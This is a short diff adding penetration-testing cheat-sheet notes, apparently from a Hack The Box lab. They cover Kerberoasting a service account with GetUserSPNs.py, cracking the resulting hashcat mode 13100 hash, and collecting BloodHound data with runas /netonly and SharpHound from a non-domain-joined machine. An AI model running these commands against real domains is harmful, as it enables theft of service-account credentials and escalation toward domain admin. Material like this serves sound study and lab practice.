@@ -1,0 +1,18 @@
+# bloodhound sharphound kerberose kerberoastable domain admins controller
+
+#Find kerberoastable via the bloodhound/sharphound data, then you can do this:
+
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+Which will give you a mode 13100 hash for hashcat to crack for the password. 
+
+
+#To get sharphound data from non-domain joined machine, do this:
+
+runas /netonly /user:domainuser
+
+[enter password for domian user]
+
+#Then that shell will automagically pass domain auth to DC and you can do this to collect data:
+
+sharphound.exe -c all -d DOMAIN --domaincontroller X.X.X.X
